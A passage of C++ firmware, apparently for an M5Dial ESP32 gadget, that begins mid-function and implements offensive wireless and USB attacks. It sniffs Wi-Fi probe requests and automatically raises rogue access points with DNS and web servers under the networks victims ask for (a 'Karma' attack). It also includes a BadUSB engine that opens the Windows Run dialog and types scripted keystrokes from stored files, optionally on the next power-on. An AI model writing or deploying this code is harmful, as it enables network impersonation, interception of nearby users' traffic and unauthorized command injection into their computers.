    M5Dial.Display.clear();
    M5Dial.Display.setTextSize(defaultTextSize);
    M5Dial.Display.setTextColor(TFT_WHITE);
    int16_t startTextX = (M5Dial.Display.width() - M5Dial.Display.textWidth("Starting Karma Attack...")) / 2;
    int16_t startTextY = M5Dial.Display.height() / 2 - 10;
    M5Dial.Display.setCursor(startTextX, startTextY);
    M5Dial.Display.println("Starting Karma Attack...");

    if (debugMode && verboseDebug) {
        Serial.println("Karma Auto Attack Started...");
    }

    WiFi.disconnect(true);
    WiFi.mode(WIFI_AP_STA);

    esp_err_t wifi_start_err = esp_wifi_start();
    if (wifi_start_err != ESP_OK) {
        if (debugMode) {
            Serial.printf("Failed to start WiFi! Error code: 0x%x\n", wifi_start_err);
        }
        isAutoKarmaActive = false;
        isKarmaRunning = false;
        return;
    }

    esp_err_t promisc_err = esp_wifi_set_promiscuous(true);
    if (promisc_err != ESP_OK) {
        if (debugMode) {
            Serial.printf("Failed to set promiscuous mode! Error code: 0x%x\n", promisc_err);
        }
        isAutoKarmaActive = false;
        isKarmaRunning = false;
        return;
    }

    esp_wifi_set_promiscuous_rx_cb(&autoKarmaPacketSniffer);
}

void stopAutoKarma() {
    isAutoKarmaActive = false;
    isKarmaRunning = false;
    esp_wifi_set_promiscuous(false);
    if (debugMode && verboseDebug) {
        Serial.println("Karma Auto Attack Stopped...");
    }
    M5Dial.Display.clear();
    currentScreen = MENU_SCREEN;
    drawMenu(currentIndex);
}

void loopAutoKarma() {
    if (!isAutoKarmaActive) return;
    while (isAutoKarmaActive) {
        M5Dial.update();

        if (M5Dial.BtnA.wasPressed()) {
            stopAutoKarma();
            return;
        }

        if (newSSIDAvailable) {
            newSSIDAvailable = false;
            activateAPForAutoKarma(lastSSID);
        } else {
            if (millis() - lastProbeDisplayUpdate > 1000) {
                displayWaitingForProbe();
                lastProbeDisplayUpdate = millis();
            }
        }

        delay(100);
    }

    memset(lastSSID, 0, sizeof(lastSSID));
    newSSIDAvailable = false;
}

void autoKarmaPacketSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT || isAPDeploying) return;

    const wifi_promiscuous_pkt_t *packet = (wifi_promiscuous_pkt_t*)buf;
    const uint8_t *frame = packet->payload;
    const uint8_t frame_type = frame[0];

    if (frame_type == 0x40) {
        uint8_t ssid_length = frame[25];
        if (ssid_length == 0 || ssid_length > 32) return;

        char tempSSID[33];
        strncpy(tempSSID, (char*)&frame[26], ssid_length);
        tempSSID[ssid_length] = '\0';

        if (strcmp(tempSSID, lastSSID) == 0) return;

        strncpy(lastSSID, tempSSID, sizeof(lastSSID) - 1);
        newSSIDAvailable = true;
        if (debugMode && verboseDebug) {
            Serial.printf("New SSID detected: %s\n", lastSSID);
        }

        saveSSID(lastSSID);
    }
}

bool isSSIDWhitelisted(const char* ssid) {
    for (const auto& wssid : whitelist) {
        if (wssid == ssid) return true;
    }
    return false;
}

void activateAPForAutoKarma(const char* ssid) {
    if (isSSIDWhitelisted(ssid) || strcmp(ssid, lastDeployedSSID) == 0) return;

    isAPDeploying = true;
    if (!WiFi.softAP(ssid, password)) {
        if (debugMode && verboseDebug) {
            Serial.println("Failed to start Karma AP");
        }
        isAPDeploying = false;
        return;
    }

    strncpy(lastDeployedSSID, ssid, sizeof(lastDeployedSSID) - 1);

    unsigned long startTime = millis();
    while (millis() - startTime < (unsigned long)autoKarmaAPDuration) {
        displayAPStatus(ssid, startTime, autoKarmaAPDuration);
        dnsServer.processNextRequest();
        server.handleClient();

        M5Dial.update();
        if (M5Dial.BtnA.wasPressed()) break;

        delay(100);
    }

    WiFi.softAPdisconnect(true);
    isAPDeploying = false;
}

void displayWaitingForProbe() {
    M5Dial.Display.fillScreen(TFT_BLACK);
    M5Dial.Display.setTextSize(defaultTextSize);
    M5Dial.Display.setTextColor(TFT_WHITE);

    int16_t waitingTextX = (M5Dial.Display.width() - M5Dial.Display.textWidth("Waiting for probe")) / 2;
    int16_t waitingTextY = M5Dial.Display.height() / 2 - 15;
    M5Dial.Display.setCursor(waitingTextX, waitingTextY);
    M5Dial.Display.print("Waiting for probe");

    unsigned long currentTime = millis();
    if (currentTime - lastProbeDisplayUpdate > 1000) {
        lastProbeDisplayUpdate = currentTime;
        probeDisplayState = (probeDisplayState + 1) % 4;

        int16_t dotsX = waitingTextX + M5Dial.Display.textWidth("Waiting for probe");
        int16_t dotsY = waitingTextY;

        M5Dial.Display.fillRect(dotsX, dotsY, M5Dial.Display.textWidth("..."), M5Dial.Display.fontHeight(), TFT_BLACK);
        M5Dial.Display.setCursor(dotsX, dotsY);
        for (int i = 0; i < probeDisplayState; i++) {
            M5Dial.Display.print(".");
        }
    }

    int16_t rectHeight = M5Dial.Display.height() / 4;
    M5Dial.Display.fillRect(0, M5Dial.Display.height() - rectHeight, M5Dial.Display.width(), rectHeight, TFT_RED);

    int16_t stopTextX = (M5Dial.Display.width() - M5Dial.Display.textWidth("Stop Auto")) / 2;
    int16_t stopTextY = M5Dial.Display.height() - rectHeight / 2 - M5Dial.Display.fontHeight() / 2;
    M5Dial.Display.setTextSize(defaultTextSize);
    M5Dial.Display.setTextColor(TFT_BLACK);
    M5Dial.Display.setCursor(stopTextX, stopTextY);
    M5Dial.Display.println("Stop Auto");
}

void displayAPStatus(const char* ssid, unsigned long startTime, int autoKarmaAPDuration) {
    M5Dial.Display.clear();

    unsigned long currentTime = millis();
    int remainingTime = autoKarmaAPDuration / 1000 - ((currentTime - startTime) / 1000);

    M5Dial.Display.setTextSize(defaultTextSize);
    M5Dial.Display.setTextColor(TFT_WHITE);

    drawRing(TFT_RED);

    int16_t x = (M5Dial.Display.width() - M5Dial.Display.textWidth(ssid)) / 2;
    int16_t y = M5Dial.Display.height() / 4;
    M5Dial.Display.setCursor(x, y);
    M5Dial.Display.println(ssid);

    String timeText = "Time: " + String(remainingTime) + "s";
    x = (M5Dial.Display.width() - M5Dial.Display.textWidth(timeText)) / 2;
    y = M5Dial.Display.height() / 2;
    M5Dial.Display.setCursor(x, y);
    M5Dial.Display.println(timeText);

    String stopText = "Press to Stop";
    M5Dial.Display.setTextSize(defaultTextSize);
    int16_t stopTextX = (M5Dial.Display.width() - M5Dial.Display.textWidth(stopText)) / 2;
    int16_t stopTextY = M5Dial.Display.height() - 50;
    M5Dial.Display.setCursor(stopTextX, stopTextY);
    M5Dial.Display.println(stopText);
}

// Settings
void powerOffDevice() {
    M5Dial.Display.clear();
    M5Dial.Display.setTextSize(defaultTextSize);
    M5Dial.Display.setTextColor(TFT_RED);

    String powerOffText = "Powering off...";
    int16_t x = (M5Dial.Display.width() - M5Dial.Display.textWidth(powerOffText)) / 2;
    int16_t y = M5Dial.Display.height() / 2;
    M5Dial.Display.setCursor(x, y);
    M5Dial.Display.println(powerOffText);

    if (debugMode && verboseDebug) {
        Serial.println("Powering off device...");
    }

    delay(2000);
    esp_deep_sleep_start();
}

void drawSettingsMenu(int index) {
    String toggleModeText = debugMode ? "Toggle BadUSB Mode" : "Toggle Normal Mode";
    const char* settingsItemsDynamic[5] = {
        "Power Off",
        "Screen Brightness",
        toggleModeText.c_str(),
        verboseDebug ? "Verbose Debug: On" : "Verbose Debug: Off",
        "Back"
    };
    drawListMenu(settingsItemsDynamic, settingsItemsCount, index, PURPLE, WHITE, PURPLE);
}

void adjustBrightness(long newPosition, long &brightnessOldPosition) {
    long brightnessChange = newPosition - brightnessOldPosition;
    if (abs(brightnessChange) >= encoderMoveThreshold) {
        brightnessOldPosition = newPosition; 
        screenBrightness = constrain(screenBrightness + brightnessChange, 0, 255); 
        M5Dial.Display.setBrightness(screenBrightness); 
        if (preferences.begin("settings", false)) {
            preferences.putInt("brightness", screenBrightness);
            preferences.end();
        }

        if (debugMode && verboseDebug) {
            Serial.printf("Adjusted brightness to: %d\n", screenBrightness);
        }

        M5Dial.Display.fillRect(0, M5Dial.Display.height()-60, M5Dial.Display.width(), 60, TFT_BLACK);
        String brightText = "Brightness: " + String(screenBrightness);
        int16_t x = (M5Dial.Display.width() - M5Dial.Display.textWidth(brightText)) / 2;
        int16_t y = M5Dial.Display.height() - 50; 
        M5Dial.Display.setCursor(x, y);
        M5Dial.Display.setTextColor(WHITE, BLACK);
        M5Dial.Display.println(brightText);
    }
}

void handleSettingsScreen(long newPosition) {
    static int settingsIndex = 0;
    static long settingsOldPosition = -999;
    static bool adjustingBrightness = false;

    String toggleModeText = debugMode ? "Toggle BadUSB Mode" : "Toggle Normal Mode";
    const char* settingsItemsDynamic[5] = {
        "Power Off",
        "Screen Brightness",
        toggleModeText.c_str(),
        verboseDebug ? "Verbose Debug: On" : "Verbose Debug: Off",
        "Back"
    };

    long movement = newPosition - settingsOldPosition;

    if (!adjustingBrightness && abs(movement) >= encoderMoveThreshold) {
        M5Dial.Speaker.tone(8000, 20);

        if (movement > 0) {
            settingsIndex = (settingsIndex + 1) % 5; 
        } else if (movement < 0) {
            settingsIndex = (settingsIndex - 1 + 5) % 5;
        }
        settingsOldPosition = newPosition;
        drawListMenu(settingsItemsDynamic, 5, settingsIndex, PURPLE, WHITE, PURPLE);
    }

    static unsigned long pressStartTime = 0;
    static bool isBtnAPressed = false;

    if (M5Dial.BtnA.wasPressed()) {
        isBtnAPressed = true;
        pressStartTime = millis();
    }

    if (isBtnAPressed && M5Dial.BtnA.wasReleased()) {
        unsigned long pressDuration = millis() - pressStartTime;
        isBtnAPressed = false;

        if (pressDuration < 1000) {
            if (settingsIndex == 1) {
                // Screen Brightness
                adjustingBrightness = !adjustingBrightness;
                settingsOldPosition = newPosition;
                if (!adjustingBrightness) {
                    drawSettingsMenu(settingsIndex);
                }
            } else {
                adjustingBrightness = false; 
                switch (settingsIndex) {
                    case 0: // Power Off
                        powerOffDevice();
                        return;
                    case 2: // Toggle HID/Debug Mode
                        toggleMode();
                        return;
                    case 3: // Verbose Debug
                        verboseDebug = !verboseDebug;
                        if (preferences.begin("settings", false)) {
                            preferences.putBool("verboseDebug", verboseDebug);
                            preferences.end();
                        }
                        if (debugMode && verboseDebug) {
                            Serial.println(verboseDebug ? "Verbose Debug Enabled" : "Verbose Debug Disabled");
                        }
                        drawSettingsMenu(settingsIndex);
                        break;
                    case 4: // Back
                        currentScreen = MENU_SCREEN;
                        drawMenu(currentIndex);
                        return;
                }
            }
        } else {
            // Long press: return to main menu
            adjustingBrightness = false;
            currentScreen = MENU_SCREEN;
            drawMenu(currentIndex);
        }
    }

    if (adjustingBrightness) {
        adjustBrightness(newPosition, settingsOldPosition);
    }
}

// BadUSB Script Execution
void enterExecuteScriptScreen() {
    scriptCurrentFileIndex = 0;
    scriptOldPosition = -999;

    listTxtFiles(SPIFFS, "/");
    if (!scriptFileNames.empty()) {
        drawScriptMenu(scriptCurrentFileIndex);
    } else {
        M5Dial.Display.clear();
        drawRing(TFT_RED);
        M5Dial.Display.setCursor(0, M5Dial.Display.height() / 2 - 10);
        M5Dial.Display.println("No .txt Files Found");
    }
}

void handleExecuteScriptScreen() {
    // Read the current encoder position and calculate the current selection index
    long newPosition = M5Dial.Encoder.read();
    int count = (int)scriptFileNames.size() + 1; // +1 for the "Back" option
    int oldIndex = scriptCurrentFileIndex;

    // Handle encoder navigation
    if (abs(newPosition - scriptOldPosition) >= encoderMoveThreshold) {
        M5Dial.Speaker.tone(8000, 20);
        scriptOldPosition = newPosition;
        scriptCurrentFileIndex = (newPosition / encoderMoveThreshold + count) % count;
        if (scriptCurrentFileIndex < 0) {
            scriptCurrentFileIndex += count;
        }

        // Redraw script menu with updated selection
        drawScriptMenu(scriptCurrentFileIndex);
    }

    // Check if the button has been long-pressed to return to the main menu
    if (M5Dial.BtnA.pressedFor(1000)) {
        currentScreen = MENU_SCREEN;
        drawMenu(currentIndex);
        return;
    }

    // Handle short press (selection)
    if (M5Dial.BtnA.wasPressed()) {
        unsigned long pressTime = millis();

        // Wait until button is released or detect long press
        while (!M5Dial.BtnA.wasReleased()) {
            M5Dial.update();
            if (M5Dial.BtnA.pressedFor(1000)) {
                // Long press detected, return to the menu
                currentScreen = MENU_SCREEN;
                drawMenu(currentIndex);
                return;
            }
            delay(10);
        }

        // Determine press duration to differentiate between short and long press
        unsigned long pressDuration = millis() - pressTime;
        if (pressDuration < 1000) {
            // Short press: either select a script or go back
            if (scriptCurrentFileIndex == (int)scriptFileNames.size()) {
                // "Back" selected
                currentScreen = MENU_SCREEN;
                drawMenu(currentIndex);
                return;
            }

            // A script file was selected
            String selectedFile = scriptFileNames[scriptCurrentFileIndex];

            // Clear the display and draw a visual accent ring
            M5Dial.Display.clear();
            drawRing(TFT_ORANGE);
            M5Dial.Display.setTextSize(defaultTextSize);
            M5Dial.Display.setTextColor(TFT_WHITE);

            if (!debugMode) {
                // HID mode: Store script for next power-on execution
                if (preferences.begin("settings", false)) {
                    preferences.putString("pendingFile", "/" + selectedFile);
                    preferences.end();
                }

                // Show confirmation message
                String msg1 = "Script selected:";
                centerText(msg1, -40); 
                String msg2 = selectedFile;
                centerText(msg2, -20);
                centerText("Will run on next power on.", 40);

            } else {
                String msg1 = "Script selected:";
                centerText(msg1, -40);
                String msg2 = selectedFile;
                centerText(msg2, -20);
                String pathToFile = "/" + selectedFile;
                readFileToSerial(SPIFFS, pathToFile.c_str());
                delay(2000);
                drawScriptMenu(scriptCurrentFileIndex);
            }
        }
    }
}

void listTxtFiles(fs::FS &fs, const char *dirname) {
    scriptFileNames.clear();
    File root = fs.open(dirname);
    if (!root || !root.isDirectory()) {
        if (debugMode && verboseDebug) Serial.println("Failed to open directory for txt files");
        return;
    }
    File file = root.openNextFile();
    while (file) {
        String fileName = String(file.name());
        if (fileName.endsWith(".txt")) {
            if (fileName.startsWith("/")) {
                fileName = fileName.substring(1);
            }
            scriptFileNames.push_back(fileName);
            if (debugMode && verboseDebug) {
                Serial.printf("Found .txt file: %s\n", fileName.c_str());
            }
        }
        file.close();
        file = root.openNextFile();
    }
}

void drawScriptMenu(int index) {
    int count = (int)scriptFileNames.size() + 1; // +1 for Back
    const char** items = new const char*[count];
    for (size_t i = 0; i < scriptFileNames.size(); i++) {
        items[i] = scriptFileNames[i].c_str();
    }
    items[count - 1] = "Back";

    drawListMenu(items, count, index, TFT_ORANGE, WHITE, TFT_ORANGE);
    delete[] items;
}

void readFileToSerial(fs::FS &fs, const char *path) {
    File file = fs.open(path);
    if (!file) {
        M5Dial.Display.drawString("Failed to Open", M5Dial.Display.width() / 2, M5Dial.Display.height() / 2);
        if (debugMode && verboseDebug) {
            Serial.println("Failed to open script file for reading");
        }
        return;
    }
    while (file.available()) {
        char c = file.read();
        Serial.write(c);
    }
    file.close();
    Serial.println("\nFile read completed.");
}

void executeKeystrokes(const char *filename) {
    File file = SPIFFS.open(filename, "r");
    if (!file) {
        M5Dial.Display.drawString("Failed to Execute", M5Dial.Display.width() / 2, M5Dial.Display.height() / 2);
        if (debugMode && verboseDebug) Serial.println("Failed to open script file for BadUSB execution");
        return;
    }

    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.write('r');
    Keyboard.releaseAll();

    // Wait 3 seconds after Win+R
    delay(3000);

    while (file.available()) {
        String line = file.readStringUntil('\n');
        line.trim();
        if (line.startsWith("DELAY")) {
            int delayTime = line.substring(6).toInt();
            delay(delayTime);
        } else if (line.startsWith("STRING")) {
            String text = line.substring(7);
            for (int i = 0; i < (int)text.length(); i++) {
                Keyboard.write(text[i]);
                delay(10);
            }
        } else if (line.equals("ENTER")) {
            Keyboard.write(KEY_RETURN);
            delay(20);
        } else if (line.equals("TAB")) {
            Keyboard.write(KEY_TAB);
            delay(20);
        } else if (line.equals("ESC")) {
            Keyboard.write(KEY_ESC);
            delay(20);
        } else if (line.startsWith("CTRL")) {
            int spaceIndex = line.indexOf(' ');
            if (spaceIndex != -1 && spaceIndex + 1 < (int)line.length()) {
                char key = line.charAt(spaceIndex + 1);
                Keyboard.press(KEY_LEFT_CTRL);
                Keyboard.write(key);
                Keyboard.releaseAll();
                delay(20);
            }
        } else if (line.startsWith("ALT")) {
            int spaceIndex = line.indexOf(' ');
            if (spaceIndex != -1 && spaceIndex + 1 < (int)line.length()) {
                char key = line.charAt(spaceIndex + 1);
                Keyboard.press(KEY_LEFT_ALT);
                Keyboard.write(key);
                Keyboard.releaseAll();
                delay(20);
            }
        }
        // after each line
        delay(50);
    }
    file.close();
    M5Dial.Display.drawString("Execution Done", M5Dial.Display.width() / 2, M5Dial.Display.height() / 2);
    if (debugMode && verboseDebug) {
        Serial.println("BadUSB Execution completed");
    }
}
